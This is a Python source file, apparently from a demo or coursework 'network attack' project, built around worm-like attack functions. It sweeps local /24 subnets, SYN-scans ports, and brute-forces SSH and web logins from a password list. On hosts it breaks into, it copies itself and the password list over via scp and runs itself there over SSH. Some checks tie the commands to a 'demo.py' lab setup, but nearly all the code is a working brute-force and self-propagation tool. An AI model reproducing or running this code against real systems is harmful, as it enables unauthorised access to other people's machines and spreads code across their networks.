#!/usr/bin/python3

# Import path to check for the existence of files and file paths.
from os import path
# Importing paramiko modules for SSH connection and exception handling.
from paramiko import SSHClient, RejectPolicy
from paramiko.ssh_exception import NoValidConnectionsError, SSHException
# Importing modules from scapy for Packet Crafting and Sending / Sniffing.
from scapy.all import get_if_addr
from scapy.interfaces import get_if_list
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr
from scapy.utils import subprocess, os
# from scapy.all import *
# Importing sleep to allow network processes time to complete.
from time import sleep
# Importing logging to safely log sensitive, error or debug info.
import logging
# Importing pipes for the piping for certain processes
import pipes
# Importing requests for web based operations.
import requests
# Importing strings for use of the external strings resources.
import strings


def additional_actions(arguments, ip, port, username,
                       transfer_file_filename):
    """
    This function passes the appropriate arguments to and runs the transferring
    file and propagating functions, these functions contain the check to stop
    them from being run if the appropriate arguments aren't used
    :param arguments: Arguments passed in by the user themselves
    :param ip: The ip address we are transferring the file to
    :param port: The port we are transferring the file through
    :param username: The username for the transfer action
    :param transfer_file_filename: Filename for the file to be transferred
    """
    try_transferring_file(arguments, ip, port, username,
                          transfer_file_filename)
    try_propagating(arguments, ip, port, username)


def append_lines_from_file_to_list(file):
    """
    This function will read a file and return the lines (minus the newline
    character) as a list
    :param file: The file to read and gather lines from
    :return lines_list: The lines themselves.
    """
    lines_list = []
    for line in file:
        lines_list.append(line.rstrip())
    return lines_list


def assigning_values(arguments):
    """
    This function will read in the target ports, target username and passwords
    filename from the user and if the user specified an ip addresses file it
    will read that and return it alongside all the other values
    :param arguments: The arguments passed in by the user
    :return ip_list: The list of IP addresses contained in the given file
    :return target_ports: The selection of ports to target
    :return target_username: The username that will be used for actions
    :return passwords_filename: The filename of the passwords file
    :return None: If an error occurs
    """
    # Out of scope initialisation for return later.
    ip_list = None
    if strings.ARGUMENT_IP_ADDRESS_FILENAME in arguments:
        try:
            ip_addresses_filename = \
                arguments[
                    arguments.index(strings.ARGUMENT_IP_ADDRESS_FILENAME) + 1]
        except RuntimeError:
            logging.error(strings.IP_FILENAME_NOT_FOUND)
            return None
        ip_list = convert_file_to_list(ip_addresses_filename)
        if ip_list is None:
            return None
    try:
        target_ports = arguments[
            arguments.index(strings.ARGUMENT_PORTS) + 1]
        target_username = \
            arguments[arguments.index(strings.ARGUMENT_USERNAME) + 1]
        if path.exists(arguments[arguments.index(
                strings.ARGUMENT_PWS_FILENAME) + 1]):
            passwords_filename = arguments[arguments.index(
                strings.ARGUMENT_PWS_FILENAME) + 1]
            return ip_list, target_ports, target_username, \
                passwords_filename
        logging.error(strings.FILE_DOES_NOT_EXIST)
        return None
    except ValueError:
        logging.error(strings.MISSING_ARGUMENT)
        return None


def check_over_ssh(ip, port, username, password):
    """
    This function checks if the net_propagation.py script is already located at
    the target machine over SSH. If it is then false is returned and if not
    then true is returned. This is needed as a prerequisite to propagating over
    SSH
    :param ip: The IP address target for SSH
    :param port: The port on which we're running SSH
    :param username: The username to target over SSH
    :param password: Password to use with SSH
    :return True: If the file doesn't exist on the target host or there's a
    problem with SSH (assuming file isn't present essentially)
    :return False: If the file does exist
    """
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(RejectPolicy)
        client.connect(hostname=str(ip), port=int(port),
                       username=str(username), password=str(password))
        if strings.touch_file(strings.DEMO_SCRIPT_FILENAME) == "touch demo.py":
            client.exec_command(pipes.quote(strings.
                                            touch_file(strings.
                                                       DEMO_SCRIPT_FILENAME)))
        else:
            logging.error(strings.SANITATION_FAILED)
            client.close()
            return False
        if strings.cat_file(strings.DEMO_SCRIPT_FILENAME) == "cat demo.py":
            if str(client.exec_command(pipes.quote(strings.cat_file(
                    strings.DEMO_SCRIPT_FILENAME)))[1]).__len__() < 1:
                client.close()
                return True

        logging.error(strings.SANITATION_FAILED)
        client.close()
        return False

    except NoValidConnectionsError:
        client.close()
        return True

    except TimeoutError:
        client.close()
        return True

    except SSHException:
        client.close()
        return True


def checking_arguments(arguments):
    """
    This function checks if the arguments are appropriately given and if
    they're not it calls the help function and kicks them out. There's also a
    check for the help argument itself. It'll try to assign the values if the
    proper arguments are given, and they're valid
    :param arguments: Arguments passed in by the user themselves
    :return values[0]: List of IP addresses
    :return values[1]: Ports and subsequently services to target
    :return values[2]: Username to target
    :return values[3]: Filename for a file containing passwords
    :return None: If the values can't be assigned.
    """
    if ((strings.ARGUMENT_IP_ADDRESS_FILENAME or
         strings.ARGUMENT_SCAN_LOCAL_NETWORKS in arguments) and
            strings.ARGUMENT_PORTS and strings.ARGUMENT_USERNAME and
            strings.ARGUMENT_USERNAME in arguments and len(arguments) >= 8 and
            strings.ARGUMENT_HELP_SHORT and strings.ARGUMENT_HELP_LONG not in
            arguments):
        try:
            values = assigning_values(arguments)
            if values is not None and strings.ARGUMENT_SCAN_LOCAL_NETWORKS \
                    not in arguments:
                return values[0], values[1], values[2], values[3]
            elif strings.ARGUMENT_SCAN_LOCAL_NETWORKS in arguments:
                return strings.SPACE, values[1], values[2], values[3]
            logging.error(strings.FAILED_ASSIGNING_VALUES)
            return None
        except RuntimeError:
            logging.error(strings.FAILED_ASSIGNING_VALUES)
            return None
    else:
        logging.error(strings.PARAMETER_MISUSE)
        return None


def connect_ssh_client(ip, port, username, password):
    """
    This function checks to see if an SSH connection can be established and if
    so then it returns true, if not then it returns false
    :param ip: The target IP address for SSH
    :param port: The target port for SSH
    :param username: The target username for SSH
    :param password: The target password for SSH
    :return True: If the SSH connect is successful
    :return False: If the SSH connect is unsuccessful
    """
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(RejectPolicy)
        client.connect(hostname=str(ip), port=int(port),
                       username=str(username), password=str(password))
        client.close()
        logging.info(strings.connection_status(strings.SSH, ip, port,
                                               strings.SUCCESSFUL))
        return True

    except SSHException:
        client.close()
        logging.debug(strings.connection_status(strings.SSH, ip, port,
                                                strings.UNSUCCESSFUL))
        return False


def connect_web(ip, port, username, password):
    """
    This function check to see if a web login can be established and if so then
    it returns true, if not then it returns false
    :param ip: The target IP address for web login
    :param port: The target port for web login
    :param username: The target username for web login
    :param password: The target password for web login
    :return True: If the web login is successful
    :return False: If the web login connect is unsuccessful
    """
    attempt_succeeded = False
    try:
        send_post_request_with_login(ip, port, username, password)
        attempt_succeeded = True
    except RuntimeError:
        logging.debug(strings.connection_status(strings.WEB, ip, port,
                                                strings.UNSUCCESSFUL))
    if attempt_succeeded:
        logging.info(strings.connection_status(strings.WEB, ip, port,
                                               strings.SUCCESSFUL))
    return attempt_succeeded


def convert_file_to_list(filename):
    """
    This function will convert a given file specified by a filename to a list
    and will then proceed to return that list
    :param filename: The filename of the file that needs to be converted to a
    list
    :return file_as_list: The list of the lines from the file
    """
    try:
        with open(filename) as file:
            file_as_list = append_lines_from_file_to_list(file)
        return file_as_list
    except FileNotFoundError:
        logging.error(strings.FILE_DOES_NOT_EXIST)
        return None


def cycle_through_subnet(ip_list, interface):
    """
    This function takes in a given network interface and an IP list, it will
    get the IP address of the interface and add all the address from its /24
    subnet to the IP list and will then return the list
    :param ip_list: The list of IP addresses in the subnet
    :param interface: The interface on which each IP address is to be checked
    for a response
    """
    interface_split = get_if_addr(interface).split(strings.FULL_STOP)
    last_byte = 0
    while last_byte < 256:
        specific_address = str(interface_split[0]) + strings.FULL_STOP \
                           + str(interface_split[1]) + strings.FULL_STOP \
                           + str(interface_split[2]) + strings.FULL_STOP \
                           + str(last_byte)
        if not ip_list.__contains__(specific_address):
            logging.info(strings.adding_address_to_interface(specific_address,
                                                             interface))
            if ip_list is not strings.SPACE:
                ip_list.append(specific_address)
            else:
                ip_list = [specific_address]
        last_byte = last_byte + 1
    return ip_list


def file_error_handler():
    """
    This function handles errors related to the processing of files.
    """
    print(strings.FILENAME_PROCESSING_ERROR)
    exit_and_show_instructions()


def file_not_exist(ip, port, username, password):
    """
    This function will check whether network_attack.py exists on a target
    machine and how it does that is dependent on the port being passed in
    :param ip: IP of the machine we're checking for a file for
    :param port: Port on which we which to check the machine
    :param username: Username to use as part of checking the file
    :param password: Password being used as part of checking the file
    :return check_over_ssh(ip, port, username, password):
    """
    return check_over_ssh(ip, port, username, password)


def gathering_local_ips(ip_list):
    """
    This function will cycle through all local interfaces outside the loopback
    interface and will add their /24 subnets to the IP list
    :param ip_list: The IPs for which we're fetching the subnets
    :return ip_list: The IP list with the newly found subnet addresses
    """
    logging.info(strings.FETCHING_LOCAL_INTERFACE_LIST)
    local_interfaces = get_if_list()
    # if strings.LOOPBACK in local_interfaces:
    #     local_interfaces = local_interfaces.remove(strings.LOOPBACK)
    for interface in local_interfaces:
        if str(interface) != strings.LOOPBACK:
            logging.info(strings.fetching_ips_for_interface(interface))
            ip_list = (cycle_through_subnet(ip_list, interface))
    return ip_list


def exit_and_show_instructions():
    """
    This function will print the help screen and show an exit prompt.
    """
    print(strings.help_output())
    print(strings.EXITING)


def is_reachable_ip(ip):
    """
    This function checks to see if an IP is reachable and returns true if it is
    and false if it isn't. The commented out code is the scapy way of doing it
    and the uncommented code uses OS calls. In my testing OS calls were faster
    but both approaches work
    :param ip: The IP address we're checking to see if it is reachable
    :return True: If the IP address is reachable
    :return False: If the IP address is not reachable
    """
    # ping_pkt = IP(dst=str(ip))/ICMP()
    # reply = sr(ping_pkt, timeout=1)[0]
    # if not reply:
    #     logging.debug(strings.ip_reachability(ip, False))
    #     return False
    # logging.info(strings.ip_reachability(ip, True))
    # return True
    command = [strings.PING, strings.PING_ARGUMENT, strings.ONE, str(ip)]
    if subprocess.call(command) == 0:
        logging.info(strings.ip_reachability(ip, True))
        return True
    logging.debug(strings.ip_reachability(ip, False))
    return False


def propagate_script(ip, port, login_string):
    """
    This function is responsible for propagating the network_attack.py to a
    previously bruteforce machine. It will only run when the user specifies
    using the appropriate argument and when the port being bruteforce is 22
    (SSH), it will also check to ensure the script isn't  already present on
    the target. It goes about propagating the script in different ways
    depending on if an SSH port is specified
    :param ip: The IP address we wish to propagate the script to
    :param port: The port through which we'll propagate the script
    :param login_string: This string contains the username and password for the
    service used
    :return True: If the script is successfully propagated here
    :return False: If the script is not successfully propagated here
    """
    login_string_split = login_string.split(strings.COLON)
    try:
        if file_not_exist(ip, port, login_string_split[0],
                          login_string_split[1]):
            print(strings.RSA_AND_PROMPT)
            os.system(strings.scp_command_string(port,
                                                 login_string_split[0],
                                                 ip,
                                                 os.path
                                                 .basename(__file__)))
            print(strings.RSA_PROMPT_AGAIN)
            os.system(strings.scp_command_string(port,
                                                 login_string_split[0],
                                                 ip,
                                                 strings.PWDS_LIST))
            client = SSHClient()
            try:
                client.set_missing_host_key_policy(RejectPolicy)
                client.connect(hostname=str(ip), port=int(port),
                               username=str(login_string_split[0]),
                               password=str(login_string_split[1]))
                if strings.run_script_command() == "./demo.py -L -p 22 -u " \
                                                   "root -f " \
                                                   "src/test_files/" \
                                                   "passwords_list.txt -P":
                    client.exec_command(pipes.quote(
                        strings.run_script_command()))
                else:
                    logging.error(strings.SANITATION_FAILED)
                    client.close()
                    return False
                client.close()
                return True
            except RuntimeError:
                client.close()
                return False
        else:
            logging.debug(strings.file_present_on_host(ip))
            return False
    except RuntimeError:
        return False


def remove_unreachable_ips(ip_list):
    """
    This function will try and ping every IP in the IP list and if it doesn't
    receive a response it will then remove that IP from the IP list
    :param ip_list: The list of IP Addresses to check
    :return new_ip_list: The revised list of IP addresses with invalid
    addresses removed.
    """
    new_ip_list = []
    for ip in ip_list:
        logging.info(strings.checking_ip_reachable(ip))
        if is_reachable_ip(ip):
            new_ip_list.append(ip)
    return new_ip_list


def scan_port(ip, port):
    """
    This function will scan a port to see if it is open. If the port is open
    then it will return true and if it is not then it will return false
    :param ip: The IP address on which the port is situated
    :param port: The port we wish to scan
    :return True: The port is open
    :return False: The port is not open
    """
    ip_header = IP(dst=ip)
    tcp_header = TCP(dport=int(port), flags=strings.SYN_FLAG)
    packet = ip_header / tcp_header
    response, unanswered = sr(packet, timeout=2)
    sleep(2)
    if len(response) > 0:
        return True
    return False


def send_post_request_with_login(ip, port, username, password):
    """
    This function sends a post request to a web server in an attempt to
    bruteforce its login details. If it succeeds with the given arguments then
    it will return the successful string of details, if not then it will return
    Null
    :param ip: The IP address with the web service
    :param port: The port of the web service
    :param username: The username for the web login
    :param password: The password for the web login
    """
    response = requests.post(strings.web_login_url(ip, port),
                             data={strings.USERNAME_PROMPT_WEB: username,
                                   strings.PASSWORD_PROMPT_WEB: password},
                             timeout=4)
    if response:
        logging.info(strings.connection_status(strings.WEB, ip, port,
                                               strings.SUCCESSFUL))
        return str(username) + strings.COLON + str(password)
    logging.debug(strings.connection_status(strings.WEB, ip, port,
                                            strings.UNSUCCESSFUL))
    return None


def sign_in_service(ip, port, username, password_list):
    """
    This function will run through every password in the password list and will
    attempt to sign in to the appropriate service with that password. It will
    only move on to the next password in the event that the current password
    fails in its sign in attempt. If it succeeds then the successful login
    details are returned, if not then Null is returned
    :param ip: The IP address to attempt to sign in to
    :param port: The port and subsequently service we're signing in to
    :param username: The username we're signing in to services on
    :param password_list: The list of passwords to attempt
    :return login_details: The username and password to return
    :return None: Only done to indicate an unsuccessful task
    """
    for password in password_list:
        login_details = try_password_for_service(ip, port, username, password)
        if login_details is not False:
            return login_details
    return None


def transfer_file(ip, port, login_string, transfer_file_filename):
    """
    This function will transfer a given file if the end user has provided the
    appropriate argument, and only when bruteforce login details are found for
    either tenet or SSH. It handles the transfer of this file differently
    depending on whether the port value given is an SSH port
    :param ip: The IP address to which the file should be transferred
    :param port: The port over which the file should be transferred
    :param login_string: The username and password needed for the transfer of
    the file over the given service
    :param transfer_file_filename: The filename of the file to be transferred
    :return True: The transfer of the file is a success
    :return False: The transfer of the file is unsuccessful
    """
    login_string_split = login_string.split(strings.COLON)
    try:
        print(strings.RSA_AND_PROMPT)
        os.system(strings.scp_command_string(port, login_string_split[0],
                                             ip, transfer_file_filename))
        return True
    except ConnectionRefusedError:
        return False


def try_action(ip, port, target_username, password_list,
               transfer_file_filename, arguments):
    """
    This function will attempt a sign in action across various services
    depending on the ip or port supplied (if the port is open on that IP), it
    iterates through the password list when you sign in to the appropriate
    service associated with the port number supplied. If the sign in action
    is successful it will then check the need for additional actions specified
    by the end user
    :param ip: The IP address on which we wish to try an action
    :param port: The port over which we wish to try an action
    :param target_username: The username for the action
    :param password_list: A list of possible passwords
    :param transfer_file_filename: A filename for file to transfer
    :param arguments: List of user specified arguments
    """
    if scan_port(ip, port):
        logging.info(strings.FOUND_OPEN_IP_PORT_PAIR)
        action_login_details = try_sign_in(ip, port, target_username,
                                           password_list)
        if action_login_details[0]:
            additional_actions(arguments, ip, port,
                               action_login_details[0],
                               transfer_file_filename)
    else:
        logging.debug(strings.CLOSED_IP_PORT_PAIR)


def try_sign_in(ip, port, target_username, password_list):
    """
    This function will try to sign in to a specific service depending on the
    port supplied. If it gets a successful login then it will return the login
    details and the service used, otherwise it returns null as the login
    details along with the service used
    :param ip: Target IP address for an action
    :param port: Target port over which to carry out an action
    :param target_username: Target username that's needed for the action
    :param password_list: Target password that's needed for the action
    :return str(sign_in_details), service: The username and password of a
    successful action with the service used
    :return None, service: Empty username and password for an unsuccessful
    action and the service which was used.
    """
    service_switch = {
        strings.SSH_PORT: strings.SSH_LOWERCASE,
        strings.WEB_PORT_EIGHTY: strings.WEB_LOGIN,
        strings.WEB_PORT_EIGHTY_EIGHTY: strings.WEB_LOGIN,
        strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: strings.WEB_LOGIN
    }
    service = service_switch.get(str(port))
    sign_in_details = sign_in_service(ip, port, target_username, password_list)
    if sign_in_details:
        logging.info(strings.working_username_password(service))
        return str(sign_in_details), service
    logging.debug(strings.IMPOSSIBLE_ACTION)
    return None, service


def try_password_for_service(ip, port, username, password):
    """
    This function tries to log into to a port's associated service using a
    specific username and password pair. If it succeeds it returns the
    successful login string, otherwise it returns an empty string
    :param ip: The specific target IP
    :param port: The specific target port
    :param username: The username to use with the password
    :param password: The password itself
    :return str(username) + ":" + str(password): The successful username and
    password combination
    :return "": Empty string for unsuccessful username and password combination
    """
    try:
        connect_service_switch = {
            strings.SSH_PORT: lambda: connect_ssh_client(ip, port, username,
                                                         password),
            strings.WEB_PORT_EIGHTY: lambda: connect_web(ip, port, username,
                                                         password),
            strings.WEB_PORT_EIGHTY_EIGHTY: lambda: connect_web(ip, port,
                                                                username,
                                                                password),
            strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: lambda:
            connect_web(ip, port, username, password),
        }
        connect_service = connect_service_switch.get(str(port))
        if connect_service():
            return str(username) + strings.COLON + str(password)
        return False

    except RuntimeError:
        return False


def try_propagating(arguments, ip, port, bruteforce):
    """
    This function attempts propagation of the network_attack.py script over
    the network. If it succeeds we alert the user and let them know what
    service was successful. If it is unsuccessful then we let the user know it
    was unsuccessful and over what service. Should the user have never asked
    for the script to be propagated over the network then we let them know this
    part of the process will not be done
    :param arguments: The arguments passed in by the user themselves
    :param ip: The IP address we wish to propagate to
    :param port: The port we're propagating through
    :param bruteforce: The username and password string combo
    """
    if strings.ARGUMENT_PROPAGATE in arguments and (port == strings.SSH_PORT):
        propagated = propagate_script(ip, port, bruteforce)
        if propagated:
            logging.info(strings.SCRIPT_PROPAGATED)
        else:
            logging.debug(strings.SCRIPT_NOT_PROPAGATED)
    else:
        logging.info(strings.DO_NOT_PROPAGATE)


def try_transferring_file(arguments, ip, port, bruteforce,
                          transfer_file_filename):
    """
    This function attempts transferring a user specified file across the
    network. If it succeeds we alert the user and let them know transferring
    the file was a success and over what service. If it is unsuccessful then we
    let the user know it was unsuccessful and over what service. Should the
    user have never asked for a file to be transferred over the network then we
    let them know this process will not be done
    :param arguments: The arguments passed in by the user themselves
    :param ip: The IP address we wish to propagate to
    :param port: The port we're propagating through
    :param bruteforce: The username and password string combo
    :param transfer_file_filename: The filename of the file we wish to transfer
    """
    if strings.ARGUMENT_SPECIFIC_PROPAGATION_FILE in arguments and \
            (str(port) == strings.SSH_PORT):
        transferred = transfer_file(ip, port, bruteforce,
                                    transfer_file_filename)
        if transferred:
            logging.info(strings.TRANSFER_SUCCESS_SSH)
        else:
            logging.debug(strings.TRANSFER_FAILURE_SSH)
    else:
        logging.info(strings.DO_NOT_TRANSFER)


def validate_file_exists(filename):
    """
    This function checks if a file exists given a set filename and if it
    doesn't we alert the user with an error, show the help screen and exit
    gracefully
    :param filename: The name of the file we wish to ensure exists
    """
    if not path.exists(filename):
        logging.error(strings.FILE_DOES_NOT_EXIST)
        exit_and_show_instructions()
